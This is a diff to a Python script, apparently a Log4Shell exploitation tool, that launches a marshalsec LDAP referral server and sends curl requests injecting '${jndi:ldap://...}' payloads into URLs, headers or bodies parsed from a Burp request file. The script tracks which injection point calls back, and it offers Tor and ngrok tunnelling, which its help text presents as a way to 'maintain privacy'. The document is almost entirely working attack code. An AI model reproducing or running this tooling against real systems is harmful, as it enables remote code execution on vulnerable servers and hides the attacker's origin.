@@ -1,16 +1,25 @@
-import subprocess, os, shlex, json, time, urllib.request, concurrent.futures, socket, argparse
+import subprocess
+import os
+import shlex
+import json
+import time
+import urllib.request
+import concurrent.futures
+import socket
+import argparse
+from sys import prefix
 from async_timeout import timeout
 from git import Repo
 
-
-stop_control = None
-
 class start_LDAP_Server():
 
-    def __init__(self, cmd, path, stop_control):
+    def __init__(self, cmd, path):
         self.cmd = cmd
         self.path = path
-        self.stop_control = stop_control
+        self.stop_control = False
+        self.forward_progress = False
+        self.msg = ""
+        self.pid = None
 
     def __del__(self):
         if hasattr(self, "proc"):
@@ -22,47 +31,38 @@ class start_LDAP_Server():
         except subprocess.CalledProcessError as e:
             print(e)
         return
-    
+
+    def getpid(self):
+        return self.proc.pid
+
     def run(self):
         os.chdir(self.path)
-        print("Verifying LDAP class...")
         if (os.path.isfile(self.path + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
             self.cmd = 'cd ' + self.path + '; ' + self.cmd
-            self.proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE)
-            while True:
-                output = self.proc.stdout.readline()
-                if output == '' and self.proc.poll() is not None:
-                    break
-                elif output.strip().decode() == 'Listening on 0.0.0.0:1389':
-                    print(output.strip().decode())
-                elif 'Send LDAP reference result for' in output.strip().decode():
-                    print(output.strip().decode())
-                    self.stop_control.stop()
-                    self.stop_control.set_msg(output.strip().decode())
-                    self.proc.send_signal(subprocess.signal.SIGKILL)
-                    exit(0)
-            self.proc.poll()
+            try:
+                self.proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE)
+                while True:
+                    output = self.proc.stdout.readline()
+                    if output == '' and self.proc.poll() is not None:
+                        break
+                    elif output.strip().decode() == 'Listening on 0.0.0.0:1389':
+                        print(output.strip().decode())
+                        print("Waiting for commands...")
+                        self.forward_progress = True
+                    elif 'Send LDAP reference result for' in output.strip().decode():
+                        self.msg = output.strip().decode()
+                        self.stop_control = True
+                        self.proc.terminate()
+                        self.proc.kill()
+                        self.proc.send_signal(subprocess.signal.SIGKILL)
+                self.proc.poll()
+            except:
+                pass
         else:
             print ('Cleaning package...')
             self.clear()
-            subprocess.run(shlex.split('xterm -e ' + self.cmd))
-
-class Stop:
-    def __init__(self):
-        self.process = True
-        self.msg = ''
-
-    def stop(self):
-        self.process = False
-
-    def status(self):
-        return self.process
-    
-    def set_msg(self, msg):
-        self.msg = msg
-
-    def get_msg(self):
-        return self.msg
+            self.run()
+        return
 
 def clear_process():
     p = subprocess.run("kill -9 $(ps aux | grep 'marshalsec.jndi.LDAPRefServer' | grep 'SNAPSHOT' | awk 'NR==1{ print $2 }')", shell=True, capture_output=True, text=True)
@@ -71,20 +71,22 @@ def clear_process():
     else:
         return
 
-def curl(list_cmd, stop_control, code):
-    time.sleep(2)
+def execute(list_cmd, process):
     os.chdir(abs_path)
-    for cmd in list_cmd:
-        time.sleep(1)
-        if stop_control.status():
+    list_code= []
+    for cmd, code in list_cmd:
+        time.sleep(2)
+        if not process.stop_control:
+            list_code.append(code)
             subprocess.run(shlex.split(cmd))
         else:
+            msg = process.msg
             break
-    msg = stop_control.get_msg()
+    
     result_code = msg.split("Send LDAP reference result for ")[1].split(' ')[0]
-    if result_code == code:
-        print("\nFound command:\n" + cmd)
-        exit(0)
+    if result_code in list_code:
+        print("\n\nFound command:\n\n" + list_cmd[list_code.index(result_code)][0])
+        end()
     else:
         print('Command not found in list')
 
@@ -154,9 +156,28 @@ def git_clone():
         os.makedirs(path + "/" + path_ldap_service.split('/')[1])
         Repo.clone_from(git_url, path + path_ldap_service)
 
-def to_process():
+def end():
+    return os.system("kill -9 " + str(os.getpid()))
+
+def verify_server(process):
+    global host_http, port_ldap_server
+    while not process.forward_progress:
+        time.sleep(3)
+    try:
+        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        clientsocket.connect((host_http, int(port_ldap_server)))
+        clientsocket.sendall(b"Hello")
+        clientsocket.close()
+        return True
+    except Exception as e:
+        if e.strerror:
+            return False
+
+def to_process(commands):
     global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path
+    
     with concurrent.futures.ThreadPoolExecutor() as executor:
+        time.sleep(1)
         p0 = executor.submit(clear_process,)
         if use_ngrok:
             p1 = executor.submit(ngrok_start)
@@ -177,23 +198,114 @@ def to_process():
                         port_nc_server = a['public_url'].split(':')[2]
         else:
             pass
-        varcode = '0001'
-        string_tor = ''
-        if use_tor:
-            string_tor = '--proxy socks5://127.0.0.1:9050 '
+        port = ":" + port_http_server
+        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http + port + '/#' + name_file +'"'
+        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_service)
+        if (os.path.isfile(abs_path + path_ldap_service + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
+            timeout = 1
+        else:
+            timeout = 20
+        try:
+            p3 = executor.submit(ldap_server.run,)
+            p3.result(timeout=timeout)
+        except concurrent.futures.TimeoutError:
+            pass
         
-        command_login = 'curl ' + string_tor + '-X POST -H "Content-Type: application/json" -d \'{"username":"${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}","password":"any"}\' ' + vuln_server
-        stop_control = Stop()
+        progress = False
+        try:
+            p4 = executor.submit(verify_server, ldap_server)
+            progress = p4.result(timeout=10)
+        except concurrent.futures.TimeoutError:
+            pass
 
-        #start_LDAP_Server(command_server_ldap, os.getcwd() + path_ldap_service)
-        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http + port_http_server + '/#' + name_file +'"'
-        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_service, stop_control)
-        p3 = executor.submit(ldap_server.run,)
-        p4 = executor.submit(curl, [command_login], stop_control, varcode)
+        if progress:
+            pass
+        else:
+            print("LDAP server loading error. Restart aplication.")
+            end()
+
+        p5 = executor.submit(execute, commands, ldap_server)
+
+def readfile(burp_file):
+    global vuln_server, method, headers, data
+    headers_end = False
+    headers = []
+    data = []
+    f = open(burp_file, "r")
+    lines = f.readlines()
     
+    for line in lines:
+        if lines.index(line) == 0:
+            line = line.strip("\n")
+            method = line.split(" ")[0]
+            sufix_host = line.split(" ")[1]
+            protocol = (line.split(" ")[2].split("/")[0]).lower()
+        elif "Host" in line:
+            prefix_host = line.strip("\n").split(": ")[1]
+        elif line == '\n':
+            headers_end = True
+        elif line != '' and line != '\n' and not headers_end:
+            headers.append(line.strip("\n"))
+        elif line != '' and line != '\n' and headers_end:
+            data.append(line.strip("\n"))
+    
+    vuln_server = protocol + '://' + prefix_host + sufix_host
+    f.close()
+    commands = prepare_list_commands()
+    return commands
+
+def check(list):
+    for l in list:
+        if "*" in l:
+            return True
+    return False
+
+def prepare_list_commands():
+    global use_tor, port_tor_tunnel, method, vuln_server, headers, data
+    
+    string_tor = ' '
+    str_header = ' '
+    str_d = data[0]
+    for i in headers:
+        str_h = '-H "' + i + '" '
+        str_header = str_header + str_h
+    if use_tor:
+        string_tor = '--proxy socks5://127.0.0.1:' + port_tor_tunnel + ' '
+    terminate = False
+    count = 0
+    commands = []
+    while not terminate:
+        count += 1
+        varcode = "{:05d}".format(count)
+        str_injection = '${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}'
+        if "*" in vuln_server:
+            vuln_server = vuln_server.replace("*", str_injection)
+            commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server, varcode))
+        elif len(headers) > 0 and check(headers):
+            for i in headers:
+                if "*" in i:
+                    i = i.replace("*", str_injection)
+                    commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server, varcode))
+                    i = i.replace(str_injection, "*")
+                    break
+        elif len(data) > 0 and "*" in data[0]:
+            count = data[0].count("*")
+            for i in range(count):
+                str_data = '-d \'' + str_d.replace("*", str_injection, i + 1) + '\''
+                if count <= (i + 1):
+                    str_data = str_data.replace(str_injection, "*", count - i)
+                commands.append(('curl' + string_tor + '-X ' + method + str_header + str_data + ' ' + vuln_server, varcode))
+            break
+        else:
+            terminate = True
+    
+    return commands
 
 def initialize():
     #global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, name_file, use_tor
+    commands = []
+    if burp_file:
+        commands = readfile(burp_file)
     git_clone()
     if use_ngrok:
         ngrok_verify()
@@ -210,10 +322,9 @@ def initialize():
             elif not ngrok_verify_file() or not ngrok_verify_file_tor():
                 ngrok_create(auth_token, port_http_server, port_ldap_server )
 
-    to_process()
+    to_process(commands)
 
 if __name__ == "__main__":
-
     name_file = 'log4jRCE'
     hostname = socket.gethostname()
     host_http = socket.gethostbyname(hostname)
@@ -225,15 +336,19 @@ if __name__ == "__main__":
         description='Usage getrevlog4shell.py -v "http://vulnerable.host" [options]',
         epilog='You must use ngrok and tor options to maintain privacy.'
         )
-    parser.add_argument("-v", "--vns", help="host vulnerable")
-    parser.add_argument("-a", "--auth", help="ngrok authtoken")
-    parser.add_argument("-ngku", "--use_ngrok", help="use ngrok", action="store_true")
-    parser.add_argument("-rctn", "--rec_ng_file", help="recreate ngrok file tunnels", action="store_true")
-    parser.add_argument("-pls", "--port_ldap_server", type=int, help="port of ldap server")
-    parser.add_argument("-phs", "--port_http_server", type=int, help="port of http server")
-    parser.add_argument("-pns", "--port_nc_listener", type=int, help="port of netcat listener")
-    parser.add_argument("-pts", "--port_tor_tunnel", type=int, help="port of tor tunnel listener")
-    parser.add_argument("-t", "--tor_proxy", help="use tor proxy", action="store_true")
+    parser.add_argument("-v", "--vns", type=str, help="Host vulnerable")
+    parser.add_argument("-a", "--auth", type=str, help="Ngrok authtoken")
+    parser.add_argument("-ngku", "--use_ngrok", help="Use ngrok", action="store_true")
+    parser.add_argument("-rctn", "--rec_ng_file", help="Recreate ngrok file tunnels", action="store_true")
+    parser.add_argument("-pls", "--port_ldap_server", type=int, help="Port of ldap server")
+    parser.add_argument("-phs", "--port_http_server", type=int, help="Port of http server")
+    parser.add_argument("-pns", "--port_nc_listener", type=int, help="Port of netcat listener")
+    parser.add_argument("-pts", "--port_tor_tunnel", type=int, help="Port of tor tunnel listener")
+    parser.add_argument("-t", "--tor_proxy", help="Use tor proxy", action="store_true")
+    parser.add_argument("-r", "--file", help="Burpsuit file")
+    parser.add_argument("-d", "--data", help="Data")
+    parser.add_argument("-H", "--headers", help="Headers")
+    parser.add_argument("-X", "--method", help="Method", default="POST", choices=["GET", "POST"])
     args = parser.parse_args()
 
     port_ldap_server = '1389'
@@ -245,21 +360,42 @@ if __name__ == "__main__":
     auth_token = None
     vuln_server = None
     use_tor = None
+    method = "POST"
+    data = []
+    headers = []
+    file = None
 
-    if args.port_ldap_server: port_ldap_server = str(args.port_ldap_server)
-    if args.port_http_server: port_http_server = str(args.port_http_server)
-    if args.port_nc_listener: port_nc_server = str(args.port_nc_listener)
-    if args.port_tor_tunnel: port_tor_tunnel = str(args.port_tor_tunnel)
+    if args.port_ldap_server: port_ldap_server = str(args.port_ldap_server).replace(" ", "")
+    if args.port_http_server: port_http_server = str(args.port_http_server).replace(" ", "")
+    if args.port_nc_listener: port_nc_server = str(args.port_nc_listener).replace(" ", "")
+    if args.port_tor_tunnel: port_tor_tunnel = str(args.port_tor_tunnel).replace(" ", "")
     if args.use_ngrok: use_ngrok = args.use_ngrok
     if args.rec_ng_file: recreate = args.rec_ng_file
-    if args.auth: auth_token = args.auth
-    if args.vns: vuln_server = args.vns
+    if args.auth: auth_token = args.auth.replace(" ", "")
+    if args.vns: vuln_server = args.vns.replace(" ", "")
     if args.tor_proxy: use_tor = args.tor_proxy
+    if args.file: burp_file = args.file.replace(" ", "")
+    if args.data: data = [args.data]
+    if args.headers: headers = args.headers
+    if args.method: method = args.method
 
-    if not vuln_server:
+    if not vuln_server and not burp_file:
         parser.print_help()
+        print('Use burpfile ou enter request.')
         exit(0)
-
+    elif burp_file:
+        pass
+    else:
+        if not '*' in vuln_server:
+            if check(data):
+                pass
+            elif check(headers):
+                pass
+            else:
+                parser.print_help()
+                print('Set location testing with param <*>.')
+                exit(0)
+    
     initialize()
     
         
